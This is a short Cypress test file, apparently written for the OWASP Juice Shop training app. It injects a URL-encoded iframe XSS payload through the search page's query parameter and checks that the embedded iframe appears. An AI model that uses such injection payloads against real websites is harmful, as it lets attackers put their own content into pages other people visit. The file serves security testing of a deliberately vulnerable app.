const baseUrl = Cypress.env("JUICESHOP_URL");
const endpoints = Cypress.env("endpoints");

describe("XSS Injection", () => {
  beforeEach(() => {
    cy.initializeUI();
  });

  it("Injecte un payload XSS pour insérer une iframe depuis la fonctionnalité de recherche", () => {
    const payload = encodeURIComponent(`
    <iframe width="100%" height="166" scrolling="no" frameborder="no" 
    allow="autoplay" 
    src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
    </iframe>
  `);
    // Access the search page with the XSS payload
    cy.visit(`${baseUrl}${endpoints.ui.search}?q=${payload}`);

    // Verify that the iframe is present
    cy.get("iframe")
      .should("exist")
      .and("have.attr", "src")
      .and("include", "https://w.soundcloud.com/player/?url=");
  });
});
